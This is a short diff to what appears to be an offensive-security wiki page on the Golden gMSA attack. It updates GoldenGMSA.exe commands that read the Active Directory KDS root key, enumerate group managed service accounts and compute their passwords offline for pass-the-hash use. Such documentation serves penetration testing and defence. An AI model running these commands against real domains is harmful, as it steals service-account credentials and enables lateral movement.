@@ -22,8 +22,8 @@ Dumping the KDS root key needs high privilege (Domain Admin, or SYSTEM on a DC) 
 GoldenGMSA.exe kdsinfo
 # Enumerate gMSAs and their managed-password IDs
 GoldenGMSA.exe gmsainfo
-# Compute a specific gMSA's password offline from the key + the account's attributes
-GoldenGMSA.exe compute --sid <gMSA-SID> --kdskey <base64-kds-key>
+# Compute a gMSA's password fully offline: SID + its managed-password ID (from gmsainfo) + the root key
+GoldenGMSA.exe compute --sid <gMSA-SID> --pwdid <managed-password-id> --kdskey <base64-kds-key>
 ```
 
 The output is the gMSA's password (and thus its NT hash / Kerberos keys), used with [pass-the-hash](../authentication/ntlm/pass-the-hash.md) or [overpass-the-hash](../authentication/kerberos/pass-the-key-and-overpass-the-hash.md).
